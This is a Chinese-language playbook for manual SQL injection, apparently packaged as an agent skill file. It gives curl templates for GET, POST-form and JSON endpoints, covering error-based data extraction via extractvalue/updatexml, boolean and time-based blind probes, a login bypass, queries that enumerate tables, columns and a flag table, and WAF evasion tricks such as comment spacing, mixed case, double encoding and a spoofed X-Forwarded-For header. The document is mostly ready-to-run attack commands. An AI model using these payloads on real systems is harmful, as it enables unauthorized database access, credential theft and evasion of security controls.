---
name: biz-sqli-manual
description: >-
  业务侧手工 SQL 注入 — 基于真实 API 的多 payload 连锁分析 + 条件组合验证 + 报错/布尔/时间盲注提数
---

# biz-sqli-manual: 业务侧手工 SQL 注入检测

> **从 Yakit 增强版 SQLi 插件方法论提炼，适配 curl/bash 手工注入**
>
> 核心方法论（Yakit 插件翻译）:
> 1. 多 payload 关联分析 — 引号数量变化导致的响应相似度波动
> 2. 条件组合验证 — 相似度 + 响应时间双重验证 (all/any 逻辑)
> 3. 分组差异化阈值 — error/time/boolean 不同敏感度
> 4. append/replace 两种插入模式 — 追加原始值 or 完全替换
> 5. 多数据库错误特征识别 — MySQL/PostgreSQL/MSSQL/Oracle
> 6. WAF 拦截检测 — 发现即跳过，避免无效请求

---

## 一、快速判断表

| 加 `'` 报错且 `''` 恢复 | **MySQL 数字型注入** |
|:------------------------|:-------------------|
| `AND 1=1` 正常 ≠ `AND 1=2` 异常 | **布尔盲注** |
| `SLEEP(5)` 响应 > 5s | **时间盲注** |
| `extractvalue` 返回 `XPATH syntax error: '~数据~'` | **MySQL 报错注入** → 直接提数 |
| `ORDER BY 10` 报错但 `ORDER BY 5` 正常 | **UNION 注入** — 5 列 |
| 返回 "您的请求已被拦截" | **被 WAF 拦截** — 换绕过 |

## 二、五步检测流程

### Step 1: 侦察 — 确定参数类型

```bash
BASE="http://target:port/api/endpoint.php?param="

# 对比原始响应和加引号响应
echo -n "原值: "; curl -s "${BASE}1" | wc -c
echo -n "引号: "; curl -s "${BASE}1'" | wc -c        # 小 + 报错消息 = 报错注入!
echo -n "双引: "; curl -s "${BASE}1''" | wc -c       # 恢复 = SQL 语法闭合
echo -n "三引: "; curl -s "${BASE}1'''" | wc -c      # 又变小 = 连锁确认
```

### Step 2: 报错注入（最快 — 优先级最高）

```bash
# MySQL
curl -s "${BASE}1 AND updatexml(1,concat(0x7e,database(),0x7e),1)--" | grep -o "~[^~]*~"
curl -s "${BASE}1 AND extractvalue(1,concat(0x7e,version(),0x7e))--" | grep -o "~[^~]*~"

# PostgreSQL  
curl -s "${BASE}1 AND 1=CAST((SELECT version()) AS int)--"

# MSSQL
curl -s "${BASE}1; WAITFOR DELAY '0:0:3'--"
```

### Step 3: 布尔对比

```bash
true=$(curl -s "${BASE}1 AND 1=1" | wc -c)
false=$(curl -s "${BASE}1 AND 1=2" | wc -c)
norm=$(curl -s "${BASE}1" | wc -c)
echo "norm=$norm  true=$true  false=$false"
# true ≈ norm 且 false ≠ norm → 布尔盲注存在
```

### Step 4: 时间盲注（最后手段）

```bash
echo "基线: $(curl -s -o /dev/null -w '%{time_total}s' "${BASE}1")"
echo "SLEEP: $(curl -s -o /dev/null -w '%{time_total}s' "${BASE}1' AND SLEEP(5)--")"
# SLEEP 耗时 ≈ 5s → 时间盲注
```

### Step 5: 提数

```bash
# 报错注入 32 字符分批取
curl -s "${BASE}1 AND extractvalue(1,concat(0x7e,(SELECT substr((SELECT flag FROM secret_flag),1,30)),0x7e))--"
curl -s "${BASE}1 AND extractvalue(1,concat(0x7e,(SELECT substr((SELECT flag FROM secret_flag),31,60)),0x7e))--"

# 查表
curl -s "${BASE}1 AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--"

# 查列
curl -s "${BASE}1 AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='secret_flag'),0x7e))--"
```

---

## 三、实战模板

### 模板 A: 数字型 GET（最常见）

```bash
BASE="http://target/api/endpoint.php?id="

echo "=== 连锁检测 ==="
for p in 1 1\' 1\'\' 1\'\'\' 1\'\'\'\'; do
  echo -n "$p  => "; curl -s "${BASE}${p}" 2>/dev/null | wc -c
done

echo "=== 报错 ==="
curl -s "${BASE}1 AND extractvalue(1,concat(0x7e,database(),0x7e))--"
echo ""

echo "=== 布尔 ==="
echo -n "1=1: "; curl -s "${BASE}1 AND 1=1" | wc -c
echo -n "1=2: "; curl -s "${BASE}1 AND 1=2" | wc -c

echo "=== 时间 ==="
curl -s -o /dev/null -w '%{time_total}s' "${BASE}1' AND SLEEP(5)--"
```

### 模板 B: POST 表单（登录/注册）

```bash
BASE="http://target/api/login.php"

# 单引号绕过认证
curl -s -X POST "$BASE" -d "username=admin' OR '1'='1&password=any"

# 报错
curl -s -X POST "$BASE" -d "username=admin' AND extractvalue(1,concat(0x7e,version(),0x7e))-- -&password=any"

# 时间  
curl -s -o /dev/null -w '%{time_total}s' -X POST "$BASE" -d "username=admin' AND SLEEP(5)-- -&password=any"
```

### 模板 C: JSON body POST（API 接口）

```bash
BASE="http://target/api/endpoint"

# JSON 中注入（利用 ' 逃逸）
curl -s -X POST "$BASE" -H 'Content-Type: application/json' \
  -d '{"username": "admin'"'"' OR '"'"'1'"'"'='"'"'1","password":"test"}'

# JSON 报错
curl -s -X POST "$BASE" -H 'Content-Type: application/json' \
  -d '{"id": "1 AND extractvalue(1,concat(0x7e,database(),0x7e))--"}'

# JSON 时间
time curl -s -X POST "$BASE" -H 'Content-Type: application/json' \
  -d '{"id": "1' AND SLEEP(5)--"}'
```

---

## 四、多数据库错误特征识别

| 报错内容示例 | 数据库 |
|:------------|:-------|
| `You have an error in your SQL syntax` / `mysqli_sql_exception` / `SQLSTATE[` | **MySQL** |
| `ERROR: parser: parse error` / `pg_exec()` / `psycopg2` | **PostgreSQL** |
| `Unclosed quotation mark` / `Msg 102` / `System.Data.SqlClient` | **MSSQL** |
| `ORA-00933` / `ORA-01722` / `ORA-` | **Oracle** |
| `SQLite error` / `unrecognized token` | **SQLite** |

---

## 五、WAF 识别与绕过

```bash
# WAF 特征关键词
# "您的请求已被拦截" / "攻击已被拦截" / "Blocked by" / "拒绝访问"

# 绕过方法:
# 1. 注释符: /**/ 代替空格
curl -s "${BASE}1'/**/AND/**/SLEEP(5)/**/--"

# 2. 大小写混合
curl -s "${BASE}1' AnD SlEeP(5)--"

# 3. 双 URL 编码
curl -s "${BASE}1%2527%2520AND%2520SLEEP(5)%2520--"

# 4. 换 HTTP 头（X-Forwarded-For 等）
curl -s -H "X-Forwarded-For: 127.0.0.1" "${BASE}1' AND SLEEP(5)--"
```

---

## 六、实战模板速查

### 报错注入取数据

```bash
# 查数据库名
extractvalue(1,concat(0x7e,database(),0x7e))

# 查所有表
extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))

# 查某表的列
extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'),0x7e))

# 取数据（32字符截断时用 SUBSTRING）
extractvalue(1,concat(0x7e,(SELECT name FROM users LIMIT 1),0x7e))
# 后半段:
extractvalue(1,concat(0x7e,substr((SELECT name FROM users LIMIT 1),30,35),0x7e))
```

## 七、完整流程示例

```bash
# 数字型 GET 检测全流程
BASE="http://target/api/endpoint.php?id="

# ① 连锁检测
for p in 1 1\' 1\'\' 1\'\'\'; do
  echo -n "$p "; curl -s "${BASE}${p}" | wc -c
done

# ② 报错注入
echo "=== 报错注入 ==="
curl -s "${BASE}1 AND extractvalue(1,concat(0x7e,database(),0x7e))--" | grep -oP "~[^~]*~"

# ③ 布尔对比
echo "=== 布尔对比 ==="
echo -n "AND 1=1: "; curl -s "${BASE}1 AND 1=1" | wc -c
echo -n "AND 1=2: "; curl -s "${BASE}1 AND 1=2" | wc -c

# ④ 时间盲注
echo "=== 时间盲注 ==="
curl -s -o /dev/null -w "%{time_total}" "${BASE}1' AND SLEEP(5)--"
